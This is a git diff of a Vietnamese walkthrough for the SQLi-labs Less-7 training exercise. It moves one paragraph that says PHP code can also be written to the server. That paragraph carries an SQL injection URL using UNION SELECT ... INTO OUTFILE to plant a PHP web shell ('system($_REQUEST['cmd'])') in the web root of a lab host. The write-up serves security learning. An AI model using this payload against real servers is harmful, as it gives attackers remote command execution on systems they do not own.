@@ -30,12 +30,6 @@ select * from table where id=(('$ID')) limit 0,1
 
 ![](../images/sqli-labs/Less-7/08.png)
 
-Nhưng ở đây ta không thể tận dụng điều này để hiển thị thông tin như ở những bài trước. Mà ở bài này ta chỉ có thể truyền vào server một đoạn code PHP 
-
-```
-http://192.168.84.233/sqli-labs/Less-7/?id=1')) union select 1,2,"<?php system($_REQUEST['cmd']);?>" INTO OUTFILE '/var/www/html/tests/1.php' --+
-```
-
 Dựa và đây ta có thể sử dụng time based để khai thác một số thông tin trong DB. Ở đây tôi có một đoạn code đơn giảm để tìm một số thông tin
 
 Ví dụ xác định tên của DB
@@ -171,6 +165,12 @@ s
 Một bảng trong số đó là `emails`
 
 Tương tự ta có thể show ra các thông tin khác trong DB
+
+Ta cũng có thể truyền vào server một đoạn code PHP 
+
+```
+http://192.168.84.233/sqli-labs/Less-7/?id=1')) union select 1,2,"<?php system($_REQUEST['cmd']);?>" INTO OUTFILE '/var/www/html/tests/1.php' --+
+```
 
 Ta thấy nó vẫn báo lỗi
 
